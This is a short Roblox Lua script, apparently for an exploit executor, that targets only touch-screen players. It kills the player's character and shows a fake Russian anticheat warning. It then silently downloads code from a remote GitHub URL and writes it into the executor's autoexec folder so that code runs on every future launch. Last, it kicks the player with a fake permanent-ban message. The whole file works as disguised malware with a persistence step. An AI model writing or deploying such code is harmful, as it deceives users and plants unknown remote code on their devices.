local uis = game:GetService("UserInputService")

if not uis.TouchEnabled or uis.KeyboardEnabled then
    return
end

task.wait(50)

if game.Players.LocalPlayer.Character then
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
end

task.wait(10)

local sg = Instance.new("ScreenGui")
sg.Parent = game.Players.LocalPlayer.PlayerGui
sg.ResetOnSpawn = false

local tl = Instance.new("TextLabel")
tl.Size = UDim2.new(1, 0, 1, 0)
tl.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
tl.TextColor3 = Color3.fromRGB(255, 50, 50)
tl.Font = Enum.Font.GothamBold
tl.TextSize = 50
tl.Text = "АНТИЧИТ ВАС ЗАМЕТИЛ!!"
tl.Parent = sg

task.wait(3)

pcall(function()
    local code = game:HttpGet("https://raw.githubusercontent.com/sealledware/hadal/refs/heads/main/core.lua")
    writefile("autoexec/system.lua", code)
end)

task.wait(1)
game.Players.LocalPlayer:Kick("Вы были забанены навсегда")
